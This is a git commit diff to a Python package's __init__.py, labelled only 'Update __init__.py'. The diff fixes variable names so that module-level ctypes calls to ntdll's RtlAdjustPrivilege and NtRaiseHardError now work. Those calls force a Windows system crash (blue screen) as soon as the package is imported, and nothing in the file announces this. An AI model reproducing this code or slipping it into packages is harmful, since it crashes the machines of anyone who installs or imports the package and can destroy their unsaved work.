5d14503896813ceb5bafbf10c6d3f4275e3a7fad
lap1sid <48173871+lap1sid@users.noreply.github.com>
2020-01-07 15:30:37 +0900

    Update __init__.py

--- __init__.py
+++ __init__.py
@@ -6,5 +6,5 @@ from ctypes import *
 from ctypes.wintypes import *
 var1 = c_bool()
 var2 = DWORD()
-ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
-ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
+ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(var1))
+ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(var2))
